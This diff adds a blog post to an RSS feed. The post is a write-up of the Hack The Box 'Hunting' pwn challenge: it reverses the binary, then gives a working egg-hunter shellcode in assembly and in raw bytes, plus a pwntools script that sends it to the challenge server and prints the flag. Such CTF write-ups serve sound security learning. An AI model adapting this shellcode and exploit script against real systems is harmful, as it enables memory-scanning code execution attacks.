@@ -78,6 +78,193 @@ And after analyzing and reading some strings we got our second part of the flag 
     </item>
     
     <item>
+      <title>HTB Hunting Writeup</title>
+      <link>/posts/htb-hunting-writeup/</link>
+      <pubDate>Mon, 05 Dec 2022 00:00:00 +0000</pubDate>
+      
+      <guid>/posts/htb-hunting-writeup/</guid>
+      <description>Hunting in the lower realms</description>
+      <content:encoded><![CDATA[<p><img loading="lazy" src="/images/htb-hunting/description.png" type="" alt=""  /></p>
+<h3 id="analyzing-the-binary">Analyzing the binary</h3>
+<p><img loading="lazy" src="/images/htb-hunting/analyze.png" type="" alt=""  />
+The binary haults for the input and crashes as we pass something.
+<img loading="lazy" src="/images/htb-hunting/strings-output.png" type="" alt=""  />
+Upon reading the stings we found a string which looks like a dummy file. Time to look for it in IDA pro.</p>
+<h3 id="ida">IDA</h3>
+<blockquote>
+<p>i changed some of the variable names for better understanding</p>
+</blockquote>
+<p>I jumped to the variable to see where it was being used and after reading the code we see that that string was being moved from one location to another.
+<img loading="lazy" src="/images/htb-hunting/img1.png" type="" alt=""  />
+It first sets a new location and copies the flag to that location then empty&rsquo;s flag value from the previous location.
+<img loading="lazy" src="/images/htb-hunting/img2.png" type="" alt=""  />
+It also creates an exit signal and triggers it with a timer of 10 seconds. Which means that program will exit after 10 seconds.
+<img loading="lazy" src="/images/htb-hunting/img3.png" type="" alt=""  /></p>
+<blockquote>
+<p>I am literally reversing it from down to top</p>
+</blockquote>
+<p>Before the singnal code, it calls a function which returns a randomly generated number.
+<img loading="lazy" src="/images/htb-hunting/img4.png" type="" alt=""  />
+Further reading the code we now know that it generates a number from a range of <code>0x5FFFFFFF</code> &lt; i &lt;= <code>0xF7000000</code>
+which is a randomly generated address.
+Then it takes to a buffer size of <code>60</code> and executes it as a shellcode. (reason why the segfault)</p>
+<p>So overall the program moves the flag to a random address location, kills the program after 10 seconds, reads our input and executes it as a shellcode.</p>
+<blockquote>
+<p>NOTE: Since the buffer size is limited. We have to be very creative and minimal while crafting our payload.</p>
+</blockquote>
+<h3 id="planning-our-exploit">Planning our exploit</h3>
+<p>Since the program kills itself after 10 seconds we will set up a timer with much higher value. Then we will traverse through addresses from a range of <code>0x5FFFFFFF</code>searching for the flag and send it to stdout if it matches.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span><span class="lnt">53
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="line"><span class="cl"><span class="nf">section</span> <span class="no">.text</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nf">global</span> <span class="no">_start</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nl">_start:</span>
+</span></span><span class="line"><span class="cl">  <span class="c1">; Set a timer to send a SIGALRM signal after 120 seconds.
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="nf">push</span> <span class="mi">120</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">pop</span> <span class="no">ebx</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">mov</span> <span class="no">al</span><span class="p">,</span> <span class="mi">0x1b</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">int</span> <span class="mi">0x80</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="c1">; Set the starting address for the search.
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="nf">mov</span> <span class="no">edi</span><span class="p">,</span> <span class="mi">0x7b425448</span> <span class="c1">; &#34;{BTH&#34;
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="nf">mov</span> <span class="no">edx</span><span class="p">,</span> <span class="mi">0x5fffffff</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nl">next_page:</span>
+</span></span><span class="line"><span class="cl">  <span class="c1">; Set the last byte address on the page.
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="nf">or</span> <span class="no">dx</span><span class="p">,</span> <span class="mi">0xfff</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="c1">; Move to the next page.
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="nf">add</span> <span class="no">edx</span><span class="p">,</span> <span class="mi">4096</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nl">next_address:</span>
+</span></span><span class="line"><span class="cl">  <span class="c1">; Move to the next address on the page.
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="nf">inc</span> <span class="no">edx</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="c1">; Check if the current address is valid.
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="nf">push</span> <span class="no">edx</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">xor</span> <span class="no">ecx</span><span class="p">,</span> <span class="no">ecx</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">mov</span> <span class="no">al</span><span class="p">,</span> <span class="mi">0x21</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">int</span> <span class="mi">0x80</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">pop</span> <span class="no">edx</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="c1">; If the address is not valid, go to the next page.
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="nf">cmp</span> <span class="no">al</span><span class="p">,</span> <span class="mi">0xf2</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">jz</span> <span class="no">next_page</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="c1">; Check if the value at the current address is the flag.
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="nf">cmp</span> <span class="no">dword</span> <span class="p">[</span><span class="no">edx</span><span class="p">],</span> <span class="no">edi</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="c1">; If the value matches, then stdout
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="nf">jnz</span> <span class="no">next_address</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">mov</span> <span class="no">ecx</span><span class="p">,</span> <span class="no">edx</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">push</span> <span class="mi">36</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">pop</span> <span class="no">edx</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">push</span> <span class="mi">1</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">pop</span> <span class="no">ebx</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">mov</span> <span class="no">al</span><span class="p">,</span> <span class="mi">0x4</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">int</span> <span class="mi">0x80</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="c1">; Exit the program.
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="nf">xor</span> <span class="no">eax</span><span class="p">,</span> <span class="no">eax</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">ret</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="pwn-time">Pwn Time</h3>
+<p>First we craft our payload into bytecodes and send it through pwntools
+<img loading="lazy" src="/images/htb-hunting/img7.png" type="" alt=""  /></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x6a\x3c\x5b\x6a\x1b\x58\xcd\x80\xbf\x48\x54\x42\x7b\xba\xff\xff\xff\x5f\x66\x81\xca\xff\x0f\x42\x60\x31\xc9\x8d\x5a\x04\xb0\x21\xcd\x80\x3c\xf2\x61\x74\xeb\x39\x3a\x75\xec\x89\xd1\x6a\x24\x5a\x6a\x01\x5b\xb0\x04\xcd\x80</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">#r = process(&#34;./hunting&#34;)</span>
+</span></span><span class="line"><span class="cl"><span class="n">r</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s2">&#34;134.209.22.121&#34;</span><span class="p">,</span> <span class="mi">31067</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">r</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">f</span> <span class="o">=</span> <span class="n">r</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">f</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">r</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img loading="lazy" src="/images/htb-hunting/img8.png" type="" alt=""  /></p>
+<p>Flag: <code>HTB{H0w_0n_34rth_d1d_y0u_f1nd_m3?!?}</code></p>
+]]></content:encoded>
+    </item>
+    
+    <item>
       <title>JHaddix Methodology V4</title>
       <link>/posts/jhaddix-methodology-v4/</link>
       <pubDate>Wed, 09 Feb 2022 00:00:00 +0000</pubDate>
